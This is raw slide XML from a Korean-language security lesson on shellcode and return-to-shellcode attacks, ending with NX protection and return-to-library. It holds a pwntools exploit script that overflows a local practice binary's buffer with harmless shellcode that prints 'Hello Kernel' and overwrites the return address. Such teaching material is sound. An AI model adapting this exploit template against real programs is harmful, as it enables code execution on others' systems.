                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 넘버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	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>syscall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C4986-625A-CB62-BA6F-8007B9B56265}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6026103" y="1785048"/>
            <a:ext cx="580716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nasm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -f elf64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shellcode.s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
          </a:p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ELF64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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형식의 오브젝트 파일 생성 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라이브러리와 연동되지 않은 실행파일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) </a:t>
            </a:r>
          </a:p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  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>shellcode.o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파일 생성</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRP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  <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="6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objcopy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --dump-section .text=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shellcode.bin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shellcode.o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</a:p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en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>shellcode.o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파일에서 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.text </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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영역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코드 영역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) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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값 추출 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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>shellcode.bin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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파일 생성</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="è"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="6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  <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>xxd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400" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>shellcode.bin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p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 .text </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US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영역 데이터 추출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D2BF6F8-6E77-3405-4534-A1C766DAB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959" y="5025929"/>
            <a:ext cx="566737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2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74DDD-FD99-8191-D3D2-C9044B28A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6C3FE1-370D-EC1E-8F15-7DCABE1510EC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8C95E-0F3C-936B-8738-E4EA5CA08216}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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43980-F39E-8C45-B9A8-C2B88C93E84F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4,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21CFC-3EAB-5DC1-C00F-4A5373E38809}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="78359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pwntools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 통해서 코드를 작성합니다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코드 페이로드 전송 후 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>main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함수의 스택 프레임을 확인해보면 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 들어가 있는 것을 확인할 수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8DD450-A2C1-B28F-0179-40BB26053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352" y="3125604"/>
            <a:ext cx="4914900" cy="17811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7CB692E-FE62-D6F7-F2A1-44CB8F85F2D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="245935" y="2119795"/>
            <a:ext cx="5473418" cy="44203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from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pwn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> import *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io = process("./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>")	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>대상 프로그램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pause()	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>정지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buffer = int(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(14), 16)	// buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>주소 받아서 정수로 변환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payload = b"\xb8\x72\x6e\x65\x6c\x50\x48\xb8\x48\x65\x6c\x6c\x6f\x20\x4b\x65\x50\x48\x89\xe6\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>xbf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\x01\x00\x00\x00\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>xba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\x0c\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05“	// shellcode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payload += b"\x00" * 0xb	// shellcode + \x00 * 0xb = 0x30bytes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payload += b"\x00" * 0x10	// + 0x00 * 0x10 = 0x40bytes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" alt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배열 끝까지 채움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payload += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b＂A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>＂ * 0x8	// + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b”A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” * 0x8 = 0x48bytes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>rbp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="100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값 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>더미값</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" alt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 넣기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payload += p64(buffer)	// + buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>주소 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>= 0x50 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>변조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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.sendline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload)	// payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보내기 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> read(0, buffer, 0x80)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pause()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print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(1024))	// “Hello Kernel” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>출력 시 받기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pause()</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="279878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605C9-CB32-07A2-8E14-0B5630C79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2C8B98-3B47-4A5B-5829-4BFC4C0C118C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56834-8DE6-2DB0-4CF8-0BE7A33B4A96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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06E60-A59F-F2C5-8D41-443468F10A51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4,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1FBE38-2AEC-992E-EE4E-86E79492E0FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1211804"/>
            <a:ext cx="96563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main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 복귀를 위한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop rip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 할 때 해당 위치에는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>변수 주소가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쓰여있고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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x7ffeeb3d2ce0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>으로 복귀를 하게 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29506AE-2201-2844-2E6E-1D92BB899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66" y="1946812"/>
            <a:ext cx="5865834" cy="2863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10724C-EB00-D11E-87AC-05A868710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84" y="2842381"/>
            <a:ext cx="4643302" cy="15156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B66A61-6C49-EC4D-DE45-5AE54BBE0A9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6721384" y="2372217"/>
            <a:ext cx="4805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이어서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작성한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쉘코드가</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 실행되어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sys_write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함수를 호출합니다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5C5B0AD-3D46-B967-19A7-F5C81BE48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92" y="5144548"/>
            <a:ext cx="4838700" cy="13525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18B21B-C687-EF69-0BEB-75E8577710FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5676484" y="5559213"/>
            <a:ext cx="48056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프로그램이 실행되는 동안</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Hello Kernel” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열이 출력된 것을 확인할 수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196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EAAC-01E1-D563-AC2C-E659D585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D9441F-E66E-C805-AD52-8AE2F757F978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D08CB-8CA2-7DB0-4BC2-F997302EC9BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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231210-B6CD-2E6E-D92D-A94C9E8566AD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4,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84910-80C4-69E7-B5E8-B3BBC39E4530}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132079" y="1211804"/>
            <a:ext cx="1186833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return to shellcode </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>공격이 가능한 이유는 사용자가 입력한 스택 영역에 실행 권한이 주어졌기 때문입니다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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, NX(Never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eXecute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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라는 보호기법이 개발되었고 해당 보호기법 적용 시 스택 영역에는 실행권한이 주어지지 않아 쉘 코드가 실행되지 않습니다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E6C8D65-A90D-5854-AD01-CF5F3D2F4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845" y="2296695"/>
            <a:ext cx="3667125" cy="16097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96014E0-7C26-A2DE-6E52-20697D091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96" y="2060753"/>
            <a:ext cx="4641261" cy="217273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ED4AD2A-A506-778E-3345-5C99DB094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96" y="4406538"/>
            <a:ext cx="4641261" cy="211688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FDDD636-7914-E28B-8112-31EF59283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845" y="4763986"/>
            <a:ext cx="3733800" cy="12573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F1A8A20-58FC-6FAD-7317-F4AB558EE7F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9234074" y="2947668"/>
            <a:ext cx="1108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NX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>비활성화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1DAE1D-1496-7FE6-AB1C-5B0E9C463DD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9312451" y="5238747"/>
            <a:ext cx="1108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NX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>활성화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78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DB95A-21F3-5909-8C2E-EEB44531A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4FF7DF-E7D3-187D-0967-F3D8F5FECEC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4720" y="0"/>
            <a:ext cx="871728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340CD62-2015-C2CC-0822-046816F9594F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C601FA-AABA-CCF8-FB4C-BAB7B24EE8C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1998168" y="3124005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13036-A381-8658-BD8E-4260BEADAA73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="3121223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94A730F-0A3D-50F9-E789-198C939BDFAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="282313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4142BF5-216F-E1A9-5D97-8AC477CC2AD8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="4011850"/>
            <a:ext cx="446789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98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FBDD-5675-19B9-74AB-3E43EEB2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A9F1B88-6968-790F-C2A1-4939268454A5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FCD68-130D-8D12-4A82-3422F6071699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72FDE6-B0EA-C586-E097-40486F294EE1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5AA2B1-0448-7B63-E5C9-F21CA304C483}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166803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NX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법의 등장으로 인해 이제 스택에 실행권한은 주어지지 않게 되었습니다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그래서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프로그램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실행권한이 주어진 영역</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(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코드 영역</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1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을 사용하여 공격할 방법을 찾기 시작했고 이 중에서 라이브러리의 함수를 호출하는 방식인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>return to library </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>기법이 등장했습니다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BDED7CC-944C-C869-4A5D-DDC43196D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433" y="2612942"/>
            <a:ext cx="8273005" cy="375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0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DD364-0430-74F5-D6DC-9728EEF7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FFE0D5C-B80C-B971-5E57-85C27190B0C5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C0EC6-C9EC-D539-8FD5-E6516082B2E1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55A77-B8E5-37F3-3E25-D4465F2FC086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61D34-8613-866A-3117-066652412A81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1249095"/>
            <a:ext cx="1166803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우선 작성된 소스 코드 컴파일 방식에는 정적 컴파일과 동적 컴파일이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같은 코드여도 정적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컴파일된</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 프로그램은 외부 라이브러리를 사용하지 않아 함수 원형 코드를 프로그램 자체에 가지고 있어 동적 컴파일 된 프로그램에 비해 파일의 크기가 더 큽니다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하지만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외부 라이브러리 파일과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로더</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 파일이 존재하지 않아도 실행할 수 있다는 장점이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E2511-A3A8-BD80-1107-3F82A918F787}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1366476" y="3066402"/>
            <a:ext cx="291814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정적 컴파일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파일 크기 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>메모리 정보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B2052-205B-8100-333D-2164CF13C24F}"/>
              </a:ext>
            </a:extLst>
